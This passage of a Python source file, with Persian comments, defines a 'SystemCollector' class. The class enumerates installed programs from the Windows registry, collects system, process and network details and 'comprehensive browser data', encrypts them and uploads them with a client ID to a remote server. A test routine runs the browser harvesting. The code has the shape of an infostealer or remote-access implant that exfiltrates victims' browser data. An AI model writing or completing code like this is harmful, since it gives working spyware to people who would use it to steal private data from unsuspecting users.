                    for i in range(winreg.QueryInfoKey(key)[0]):
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if winreg.QueryValueEx(subkey, "DisplayVersion")[1] == 1 else "N/A"
                            publisher = winreg.QueryValueEx(subkey, "Publisher")[0] if winreg.QueryValueEx(subkey, "Publisher")[1] == 1 else "N/A"
                            install_date = winreg.QueryValueEx(subkey, "InstallDate")[0] if winreg.QueryValueEx(subkey, "InstallDate")[1] == 1 else "N/A"
                            
                            programs.append({
                                "name": display_name,
                                "version": version,
                                "publisher": publisher,
                                "install_date": install_date
                            })
                        except FileNotFoundError:
                            continue
                        finally:
                            winreg.CloseKey(subkey)
                    winreg.CloseKey(key)
                except Exception as e:
                    self.logger.error(f"Failed to read registry path {reg_path}: {str(e)}")

            self.results["installed_programs"] = programs
            self.logger.info(f"Collected {len(programs)} installed programs")
            return programs

        except Exception as e:
            self.results["installed_programs"] = {"error": str(e)}
            self.logger.error(f"Failed to collect installed programs: {str(e)}")
            return []

    def collect_all_data(self):
        """جمع‌آوری تمام داده‌ها"""
        if not Config.ENABLE_SYSTEM_INFO:
            self.logger.info("System data collection disabled")
            return {"message": "System data collection disabled"}

        self.logger.info("Starting comprehensive system data collection...")
        
        # جمع‌آوری اطلاعات اصلی
        self.collect_system_info()
        
        # جمع‌آوری اطلاعات اختیاری
        if Config.COLLECT_RUNNING_PROCESSES:
            self.collect_running_processes()
        
        if Config.COLLECT_NETWORK_INFO:
            self.collect_network_info()
        
        if Config.ENABLE_BROWSER_DATA_COLLECTION:
            self.collect_comprehensive_browser_data()
        
        if Config.COLLECT_INSTALLED_PROGRAMS:
            self.collect_installed_programs()

        self.logger.info("Comprehensive system data collection completed")
        return self.results

    def send_data(self):
        """ارسال داده‌ها به سرور"""
        if not Config.ENABLE_SYSTEM_INFO:
            self.logger.info("Data sending disabled")
            return

        self.logger.info("Sending collected data to server...")
        try:
            # ارسال اطلاعات سیستم
            encrypted_system_info = self.encryption_manager.encrypt(json.dumps(self.results["system_info"]))
            self.communicator._send_request(
                "action=upload_data",
                data={
                    "client_id": self.client_id,
                    "system_info": encrypted_system_info
                }
            )

            # ارسال اطلاعات مرورگر
            if self.results["browser_data"]:
                encrypted_browser_data = self.encryption_manager.encrypt(json.dumps(self.results["browser_data"]))
                self.communicator._send_request(
                    "action=upload_browser_data",
                    data={
                        "client_id": self.client_id,
                        "browser_data": encrypted_browser_data
                    }
                )

            self.logger.info("All data sent successfully")

        except CommunicationError as e:
            self.logger.error(f"Failed to send data: {str(e)}")

    def run(self):
        """اجرای کامل فرآیند جمع‌آوری و ارسال"""
        if not Config.ENABLE_SYSTEM_INFO:
            self.logger.info("System collector disabled in config")
            return

        self.logger.info("Starting system data collection and upload...")
        self.collect_all_data()
        self.send_data()
        self.logger.info("System data collection and upload completed")

# تست مستقل
def test_collector():
    """تابع تست برای بررسی عملکرد collector"""
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s'
    )
    
    collector = SystemCollector()
    
    print("🧪 Testing System Collector...")
    
    # تست جمع‌آوری داده‌های مرورگر
    print("🔍 Testing browser data collection...")
    browser_result = collector.collect_comprehensive_browser_data()
    print(f"Browser collection result: {browser_result.get('status')}")
    print(f"Detected browsers: {list(browser_result.get('data', {}).keys())}")
    
    # تست جمع‌آوری اطلاعات سیستم
    print("💻 Testing system info collection...")
    system_info = collector.collect_system_info()
    print(f"System info collected: {len(system_info)} items")
    
    print("✅ Testing completed!")

if __name__ == "__main__":
    test_collector()